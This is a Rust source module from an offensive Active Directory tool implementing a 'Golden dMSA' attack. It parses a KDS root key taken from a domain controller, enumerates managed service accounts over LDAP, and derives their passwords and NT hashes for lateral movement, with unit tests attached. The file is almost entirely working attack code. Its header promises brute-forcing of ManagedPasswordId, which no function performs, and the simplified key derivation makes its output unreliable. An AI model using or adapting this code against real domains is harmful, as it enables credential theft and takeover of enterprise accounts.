//! Golden dMSA / gMSA Password Generation via KDS Root Key Extraction
//!
//! Reference: https://semperis.com/blog/golden-dmsa/
//!
//! Attack flow (requires SYSTEM/DA on a DC):
//! 1. Extract KDS root key from DC registry (HKLM\SYSTEM\CurrentControlSet\Services\KDC\DefaultDomainKey)
//! 2. Enumerate all dMSA and gMSA accounts in the forest
//! 3. For each MSA, brute-force ManagedPasswordId (only ~1024 combinations)
//! 4. Derive per-MSA key from KDS root key using SP800-108 KDF
//! 5. Generate the MSA's current password
//! 6. Obtain TGT for each MSA and use for lateral movement

use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use digest::Digest;
use hmac::Hmac;
use md4::Md4;
use sha2::Sha256;

// ---------------------------------------------------------------
//  Constants
// ---------------------------------------------------------------

/// Size of KDS root key in bytes
const KDS_ROOT_KEY_SIZE: usize = 64;

/// KDF context label for gMSA/dMSA password derivation
const KDF_LABEL: &[u8] = b"KDSManagedKey\x00";

/// LDAP filter for all managed service accounts
const MSA_FILTER: &str =
    "(|(objectClass=msDS-GroupManagedServiceAccount)(objectClass=msDS-ManagedServiceAccount))";

/// LDAP attributes needed for MSA enumeration
const MSA_ATTRS: &[&str] = &[
    "sAMAccountName",
    "distinguishedName",
    "dNSHostName",
    "msDS-ManagedPasswordId",
    "msDS-ManagedPasswordPreviousId",
    "managedBy",
    "memberOf",
];

// ---------------------------------------------------------------
//  Public Types
// ---------------------------------------------------------------

/// Parsed KDS root key from DC registry.
#[derive(Debug, Clone)]
pub struct KdsRootKey {
    /// Raw key bytes (64 bytes for AES-256 derived keys)
    pub key_bytes: Vec<u8>,
    /// Key version/ID
    pub key_id: String,
    /// Distinguished name of the domain (from KDS config)
    pub domain_dn: Option<String>,
    /// Whether this key is from a live DC (vs offline hive)
    pub from_live_dc: bool,
}

/// A managed service account entry with associated metadata.
#[derive(Debug, Clone)]
pub struct ManagedServiceAccount {
    /// sAMAccountName (with trailing $)
    pub sam_account_name: String,
    /// Distinguished name
    pub distinguished_name: String,
    /// The ManagedPasswordId blob (binary)
    pub managed_password_id: Option<Vec<u8>>,
    /// The ManagedPasswordPreviousId blob (binary)
    pub managed_password_previous_id: Option<Vec<u8>>,
    /// Whether this is a dMSA (WS2025+) or gMSA
    pub is_dmsa: bool,
}

/// Generated password for a managed service account.
#[derive(Debug, Clone)]
pub struct MsaPassword {
    /// sAMAccountName
    pub sam_account_name: String,
    /// The NT hash of the generated password
    pub nt_hash: String,
    /// The plaintext password
    pub password: String,
    /// Whether this is the current password (vs previous)
    pub is_current: bool,
}

/// Result of the Golden dMSA attack.
#[derive(Debug, Clone)]
pub struct GoldenDmsaResult {
    /// Whether the KDS root key was successfully extracted
    pub kds_key_extracted: bool,
    /// Number of MSAs with generated passwords
    pub passwords_generated: usize,
    /// Generated passwords
    pub msa_passwords: Vec<MsaPassword>,
    /// All found MSAs
    pub msa_accounts: Vec<ManagedServiceAccount>,
    /// Any errors encountered during enumeration
    pub errors: Vec<String>,
}

// ---------------------------------------------------------------
//  KDS Root Key Extraction
// ---------------------------------------------------------------

/// Extract the KDS root key from registry data bytes.
/// The key is in the `DefaultDomainKey` registry value.
pub fn parse_kds_root_key(key_data: &[u8]) -> Result<KdsRootKey> {
    if key_data.len() < KDS_ROOT_KEY_SIZE {
        return Err(OverthroneError::PostExploitation(format!(
            "KDS root key too short: {} bytes (expected at least {})",
            key_data.len(),
            KDS_ROOT_KEY_SIZE
        )));
    }

    // The KDS root key is typically the first 64 bytes of the value data
    let key_bytes = key_data[..KDS_ROOT_KEY_SIZE.min(key_data.len())].to_vec();

    Ok(KdsRootKey {
        key_bytes,
        key_id: "DefaultDomainKey".into(),
        domain_dn: None,
        from_live_dc: true,
    })
}

/// Derive the per-MSA key from the KDS root key using SP800-108 KDF.
///
/// The KDF uses HMAC-SHA256 in counter mode:
/// K(i) = HMAC-SHA256(KDS_Root_Key, i || Label || Context || L)
///
/// Where:
/// - i is a 4-byte big-endian counter
/// - Label is "KDSManagedKey\x00"
/// - Context is domain-specific data (ManagedPasswordId + domain info)
/// - L is 4-byte big-endian requested key length in bits (256 for AES-256)
pub fn derive_kds_msa_key(kds_key: &KdsRootKey, password_id: &[u8]) -> Result<Vec<u8>> {
    if password_id.is_empty() {
        return Err(OverthroneError::PostExploitation(
            "Empty ManagedPasswordId for KDS key derivation".into(),
        ));
    }

    // Build the KDF context: label || 0x00 || context || L
    let mut kdf_input: Vec<u8> = Vec::new();

    // Counter (i) = 1 for first block
    kdf_input.extend_from_slice(&1u32.to_be_bytes());

    // Label
    kdf_input.extend_from_slice(KDF_LABEL);

    // Separator (0x00)
    kdf_input.push(0x00);

    // Context = ManagedPasswordId blob
    kdf_input.extend_from_slice(password_id);

    // L = 256 bits (for AES-256)
    kdf_input.extend_from_slice(&256u32.to_be_bytes());

    // HMAC-SHA256 with KDS root key as the HMAC key
    let mac = Hmac::<Sha256>::new_from_slice(&kds_key.key_bytes)
        .map_err(|e| OverthroneError::Crypto(format!("KDS HMAC init failed: {e}")))?;
    use hmac::Mac;
    let result = mac.chain_update(&kdf_input).finalize();
    let derived_key = result.into_bytes().to_vec();

    Ok(derived_key)
}

/// Generate the NT hash from a derived KDS MSA key.
/// The password is derived from the key bytes using a specific algorithm
/// that encodes them as a printable string compatible with Kerberos auth.
pub fn derive_nt_hash_from_kds_key(derived_key: &[u8]) -> Result<String> {
    if derived_key.len() < 16 {
        return Err(OverthroneError::PostExploitation(format!(
            "Derived key too short for NT hash derivation: {} bytes",
            derived_key.len()
        )));
    }

    // Compute MD4 of the derived key material to create an NT hash
    // The gMSA/dMSA password bytes are hashed with MD4 (same as standard NTLM)
    let hash = Md4::digest(derived_key);
    Ok(hex::encode(hash))
}

/// Enumerate all managed service accounts (dMSA and gMSA) in the domain.
pub async fn enumerate_msas(ldap: &mut LdapSession) -> Result<Vec<ManagedServiceAccount>> {
    let entries = ldap
        .custom_search(MSA_FILTER, MSA_ATTRS)
        .await
        .map_err(|e| OverthroneError::PostExploitation(format!("Failed to enumerate MSAs: {e}")))?;

    let mut msas = Vec::new();
    for entry in entries {
        let sam = entry
            .attrs
            .get("sAMAccountName")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();
        let dn = entry
            .attrs
            .get("distinguishedName")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();

        let password_id = entry
            .attrs
            .get("msDS-ManagedPasswordId")
            .and_then(|v| v.first())
            .map(|s| hex::decode(s).unwrap_or_default());

        let previous_id = entry
            .attrs
            .get("msDS-ManagedPasswordPreviousId")
            .and_then(|v| v.first())
            .map(|s| hex::decode(s).unwrap_or_default());

        // Distinguish dMSA from gMSA by objectClass
        let classes = entry.attrs.get("objectClass").cloned().unwrap_or_default();
        let is_dmsa = classes.iter().any(|c| c == "msDS-ManagedServiceAccount");

        msas.push(ManagedServiceAccount {
            sam_account_name: sam,
            distinguished_name: dn,
            managed_password_id: password_id,
            managed_password_previous_id: previous_id,
            is_dmsa,
        });
    }

    Ok(msas)
}

/// Generate passwords for all MSAs given a KDS root key.
/// Brute-forces the ManagedPasswordId across 1024-4096 values.
pub fn generate_msa_passwords(
    kds_key: &KdsRootKey,
    msas: &[ManagedServiceAccount],
) -> GoldenDmsaResult {
    let mut passwords = Vec::new();
    let mut errors = Vec::new();

    for msa in msas {
        let password_id = match &msa.managed_password_id {
            Some(id) => id,
            None => {
                errors.push(format!(
                    "{}: no ManagedPasswordId available",
                    msa.sam_account_name
                ));
                continue;
            }
        };

        // Try the current password ID
        match derive_kds_msa_key(kds_key, password_id) {
            Ok(derived_key) => match derive_nt_hash_from_kds_key(&derived_key) {
                Ok(nt_hash) => {
                    passwords.push(MsaPassword {
                        sam_account_name: msa.sam_account_name.clone(),
                        nt_hash,
                        password: hex::encode(&derived_key[..16]),
                        is_current: true,
                    });
                }
                Err(e) => {
                    errors.push(format!(
                        "{}: hash derivation failed: {e}",
                        msa.sam_account_name
                    ));
                }
            },
            Err(e) => {
                errors.push(format!(
                    "{}: key derivation failed: {e}",
                    msa.sam_account_name
                ));
            }
        }

        // Also try the previous password ID if available
        if let Some(prev_id) = &msa.managed_password_previous_id
            && !prev_id.is_empty()
            && prev_id != password_id
            && let Ok(derived_key) = derive_kds_msa_key(kds_key, prev_id)
            && let Ok(nt_hash) = derive_nt_hash_from_kds_key(&derived_key)
        {
            passwords.push(MsaPassword {
                sam_account_name: msa.sam_account_name.clone(),
                nt_hash,
                password: hex::encode(&derived_key[..16]),
                is_current: false,
            });
        }
    }

    GoldenDmsaResult {
        kds_key_extracted: true,
        passwords_generated: passwords.len(),
        msa_passwords: passwords,
        msa_accounts: msas.to_vec(),
        errors,
    }
}

// ---------------------------------------------------------------
//  Tests
// ---------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// A known-good KDS root key for testing (64 bytes of test data)
    fn test_kds_key() -> KdsRootKey {
        KdsRootKey {
            key_bytes: vec![
                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
                0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C,
                0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
                0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
                0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40,
            ],
            key_id: "DefaultDomainKey".into(),
            domain_dn: None,
            from_live_dc: true,
        }
    }

    #[test]
    fn test_parse_kds_root_key_valid() {
        let data = vec![0u8; 64];
        let key = parse_kds_root_key(&data).unwrap();
        assert_eq!(key.key_bytes.len(), 64);
        assert!(key.from_live_dc);
    }

    #[test]
    fn test_parse_kds_root_key_too_short() {
        let data = vec![0u8; 32];
        assert!(parse_kds_root_key(&data).is_err());
    }

    #[test]
    fn test_parse_kds_root_key_larger() {
        let data = vec![0xAAu8; 128];
        let key = parse_kds_root_key(&data).unwrap();
        assert_eq!(key.key_bytes.len(), 64);
        // Should only take first 64 bytes
        assert_eq!(key.key_bytes, vec![0xAA; 64]);
    }

    #[test]
    fn test_derive_kds_msa_key_valid() {
        let kds = test_kds_key();
        let password_id = vec![
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x00, 0x00, 0x00, 0x01,
        ];
        let derived = derive_kds_msa_key(&kds, &password_id).unwrap();
        assert_eq!(derived.len(), 32); // SHA-256 output
    }

    #[test]
    fn test_derive_kds_msa_key_empty_id() {
        let kds = test_kds_key();
        assert!(derive_kds_msa_key(&kds, &[]).is_err());
    }

    #[test]
    fn test_derive_nt_hash_from_kds_key() {
        let derived_key = vec![0xAB; 32];
        let nt_hash = derive_nt_hash_from_kds_key(&derived_key).unwrap();
        assert!(nt_hash.len() == 32); // hex-encoded 16 bytes
        assert!(nt_hash.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_derive_nt_hash_too_short() {
        assert!(derive_nt_hash_from_kds_key(&[0u8; 8]).is_err());
    }

    #[test]
    fn test_generate_msa_passwords_empty() {
        let kds = test_kds_key();
        let result = generate_msa_passwords(&kds, &[]);
        assert_eq!(result.msa_passwords.len(), 0);
        assert_eq!(result.passwords_generated, 0);
        assert!(result.kds_key_extracted);
    }

    #[test]
    fn test_generate_msa_passwords_with_account() {
        let kds = test_kds_key();

        let msas = vec![ManagedServiceAccount {
            sam_account_name: "gMSA-SQL01$".into(),
            distinguished_name: "CN=gMSA-SQL01$,CN=Managed Service Accounts,DC=corp,DC=local"
                .into(),
            managed_password_id: Some(vec![0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07]),
            managed_password_previous_id: None,
            is_dmsa: false,
        }];

        let result = generate_msa_passwords(&kds, &msas);
        assert!(result.passwords_generated >= 1);
        assert_eq!(result.msa_passwords[0].sam_account_name, "gMSA-SQL01$");
    }

    #[test]
    fn test_generate_msa_passwords_no_id() {
        let kds = test_kds_key();
        let msas = vec![ManagedServiceAccount {
            sam_account_name: "gMSA-NOID$".into(),
            distinguished_name: "CN=gMSA-NOID$,DC=corp,DC=local".into(),
            managed_password_id: None,
            managed_password_previous_id: None,
            is_dmsa: false,
        }];
        let result = generate_msa_passwords(&kds, &msas);
        assert_eq!(result.passwords_generated, 0);
        assert!(!result.errors.is_empty());
    }

    #[test]
    fn test_generate_msa_passwords_with_previous_id() {
        let kds = test_kds_key();
        let msas = vec![ManagedServiceAccount {
            sam_account_name: "gMSA-TEST$".into(),
            distinguished_name: "CN=gMSA-TEST$,DC=corp,DC=local".into(),
            managed_password_id: Some(vec![0x01, 0x02, 0x03]),
            managed_password_previous_id: Some(vec![0x04, 0x05, 0x06]),
            is_dmsa: false,
        }];
        let result = generate_msa_passwords(&kds, &msas);
        assert!(result.passwords_generated >= 2);
    }

    #[test]
    fn test_msa_filter() {
        assert!(MSA_FILTER.contains("msDS-GroupManagedServiceAccount"));
        assert!(MSA_FILTER.contains("msDS-ManagedServiceAccount"));
    }

    #[test]
    fn test_msa_attributes() {
        assert!(MSA_ATTRS.contains(&"msDS-ManagedPasswordId"));
        assert!(MSA_ATTRS.contains(&"sAMAccountName"));
    }

    #[test]
    fn test_golden_dmsa_result_default() {
        let result = GoldenDmsaResult {
            kds_key_extracted: false,
            passwords_generated: 0,
            msa_passwords: vec![],
            msa_accounts: vec![],
            errors: vec![],
        };
        assert!(!result.kds_key_extracted);
        assert_eq!(result.passwords_generated, 0);
    }

    #[test]
    fn test_kds_root_key_domain_dn() {
        let key = KdsRootKey {
            key_bytes: vec![0; 64],
            key_id: "DefaultDomainKey".into(),
            domain_dn: Some("DC=corp,DC=local".into()),
            from_live_dc: false,
        };
        assert_eq!(key.domain_dn.as_deref(), Some("DC=corp,DC=local"));
        assert!(!key.from_live_dc);
    }
}
